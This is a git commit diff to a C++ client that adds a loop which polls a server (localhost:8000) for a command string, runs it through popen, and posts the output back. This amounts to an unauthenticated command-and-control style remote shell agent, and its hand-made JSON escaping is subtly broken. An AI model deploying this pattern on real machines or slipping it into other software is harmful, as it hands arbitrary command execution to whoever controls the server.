66c10e55b5dcd0f1da69054851230fa3a758d677
wdani <68472201+WilleLX1@users.noreply.github.com>
2025-06-10 17:58:23 +0200

    Execute commands on client

--- client.cpp
+++ client.cpp
@@ -1,5 +1,6 @@
 #include <iostream>
 #include <string>
+#include <cstring>
 #ifdef _WIN32
 #  include <winsock2.h>
 #  include <ws2tcpip.h>
@@ -9,11 +10,51 @@
 #  include <sys/socket.h>
 #  include <netdb.h>
 #  include <unistd.h>
+#  define INVALID_SOCKET -1
+#  define SOCKET_ERROR   -1
 #endif
 
+std::string host = "localhost";
+std::string port = "8000";
+
+#ifdef _WIN32
+using socket_t = SOCKET;
+#else
+using socket_t = int;
+#endif
+
+std::string send_request(const addrinfo* res, const std::string& req) {
+    socket_t sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+    if (sock == INVALID_SOCKET) {
+        std::cerr << "socket creation failed" << std::endl;
+        return "";
+    }
+    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
+#ifdef _WIN32
+        std::cerr << "connect failed: " << WSAGetLastError() << std::endl;
+        closesocket(sock);
+#else
+        perror("connect");
+        close(sock);
+#endif
+        return "";
+    }
+    send(sock, req.c_str(), (int)req.size(), 0);
+    char buf[4096];
+    std::string resp;
+    int n;
+    while ((n = recv(sock, buf, sizeof(buf), 0)) > 0) {
+        resp.append(buf, buf + n);
+    }
+#ifdef _WIN32
+    closesocket(sock);
+#else
+    close(sock);
+#endif
+    return resp;
+}
+
 int main(int argc, char* argv[]) {
-    std::string host = "localhost";
-    std::string port = "8000";
 #ifdef _WIN32
     std::string client_id = "client_" + std::to_string(GetCurrentProcessId());
 #else
@@ -39,67 +80,81 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    SOCKET sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
-    if (sock == INVALID_SOCKET) {
-        #ifdef _WIN32
-        std::cerr << "socket failed: " << WSAGetLastError() << std::endl;
-        #else
-        perror("socket");
-        #endif
-        freeaddrinfo(res);
-        #ifdef _WIN32
-        WSACleanup();
-        #endif
-        return 1;
-    }
-
-    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
-        #ifdef _WIN32
-        std::cerr << "connect failed: " << WSAGetLastError() << std::endl;
-        closesocket(sock);
-        WSACleanup();
-        #else
-        perror("connect");
-        close(sock);
-        #endif
-        freeaddrinfo(res);
-        return 1;
-    }
-
     std::string body = "{\"client_id\":\"" + client_id + "\"}";
-    std::string request;
-    request += "POST /register HTTP/1.1\r\n";
-    request += "Host: " + host + "\r\n";
-    request += "Content-Type: application/json\r\n";
-    request += "Content-Length: " + std::to_string(body.size()) + "\r\n";
-    request += "\r\n";
-    request += body;
+    std::string req = "POST /register HTTP/1.1\r\n";
+    req += "Host: " + host + "\r\n";
+    req += "Content-Type: application/json\r\n";
+    req += "Content-Length: " + std::to_string(body.size()) + "\r\n";
+    req += "\r\n";
+    req += body;
+    send_request(res, req);
 
-    if (send(sock, request.c_str(), (int)request.size(), 0) == SOCKET_ERROR) {
-        #ifdef _WIN32
-        std::cerr << "send failed: " << WSAGetLastError() << std::endl;
-        #else
-        perror("send");
-        #endif
+    while (true) {
+        std::string pollReq = "GET /poll?client_id=" + client_id + " HTTP/1.1\r\n";
+        pollReq += "Host: " + host + "\r\n\r\n";
+        std::string resp = send_request(res, pollReq);
+        auto pos = resp.find("\r\n\r\n");
+        std::string bodyResp = pos != std::string::npos ? resp.substr(pos + 4) : resp;
+        std::string command;
+        auto cpos = bodyResp.find("\"command\"");
+        if (cpos != std::string::npos) {
+            auto q1 = bodyResp.find('"', cpos + 9);
+            if (q1 != std::string::npos) {
+                auto q2 = bodyResp.find('"', q1 + 1);
+                if (q2 != std::string::npos)
+                    command = bodyResp.substr(q1 + 1, q2 - q1 - 1);
+            }
+        }
+        if (!command.empty()) {
+            std::cout << "Command: " << command << std::endl;
+            std::string result;
+#ifdef _WIN32
+            FILE* pipe = _popen(command.c_str(), "r");
+#else
+            FILE* pipe = popen(command.c_str(), "r");
+#endif
+            if (pipe) {
+                char buf[256];
+                while (fgets(buf, sizeof(buf), pipe)) {
+                    result += buf;
+                }
+#ifdef _WIN32
+                _pclose(pipe);
+#else
+                pclose(pipe);
+#endif
+            }
+            if (result.empty()) result = "(no output)";
+            // escape backslashes and quotes for JSON
+            std::string esc;
+            for (char ch : result) {
+                if (ch == '\\' || ch == '"') esc += '\\';
+                if (ch == '\n') {
+                    esc += "\n";
+                } else if (ch == '\r') {
+                    continue;
+                } else {
+                    esc += ch;
+                }
+            }
+            std::string resBody = "{\"client_id\":\"" + client_id + "\",\"result\":\"" + esc + "\"}";
+            std::string resReq = "POST /result HTTP/1.1\r\n";
+            resReq += "Host: " + host + "\r\n";
+            resReq += "Content-Type: application/json\r\n";
+            resReq += "Content-Length: " + std::to_string(resBody.size()) + "\r\n\r\n";
+            resReq += resBody;
+            send_request(res, resReq);
+        }
+#ifdef _WIN32
+        Sleep(1000);
+#else
+        sleep(1);
+#endif
     }
 
-    char buf[1024];
-#ifdef _WIN32
-    int n = recv(sock, buf, sizeof(buf) - 1, 0);
-#else
-    ssize_t n = recv(sock, buf, sizeof(buf) - 1, 0);
-#endif
-    if (n > 0) {
-        buf[n] = '\0';
-        std::cout << buf << std::endl;
-    }
-
-#ifdef _WIN32
-    closesocket(sock);
-    WSACleanup();
-#else
-    close(sock);
-#endif
     freeaddrinfo(res);
+#ifdef _WIN32
+    WSACleanup();
+#endif
     return 0;
 }
